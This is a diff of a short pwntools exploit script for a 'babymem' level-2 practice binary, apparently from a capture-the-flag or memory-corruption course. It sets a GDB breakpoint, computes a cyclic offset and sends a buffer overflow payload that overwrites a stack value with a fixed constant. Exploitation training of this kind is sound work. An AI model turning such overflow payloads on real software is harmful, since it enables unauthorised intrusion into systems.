@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template ./babymem_level2.0
+# $ pwn template ./babymem-level-2-0
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or './babymem_level2.0')
+exe = context.binary = ELF(args.EXE or './babymem-level-2-1')
 
+context.terminal = ['wt.exe', '-w', '0', 'nt', 'wsl.exe', '--']
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
@@ -25,7 +26,8 @@ def start(argv=[], *a, **kw):
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
-tbreak main
+#tbreak main
+break *challenge+270
 continue
 '''.format(**locals())
 
@@ -42,9 +44,13 @@ continue
 # Stripped:   No
 
 io = start()
+offset = cyclic_find(0x61616179)
 
-io.sendline(str(8*9))
-io.send(p32(0x2e6398b3)*9*2)
+pay = flat({
+    offset: p32(0x50e0a652)
+})
 
+io.sendline(str(len(pay)))
+io.sendline(pay)
 io.interactive()
 
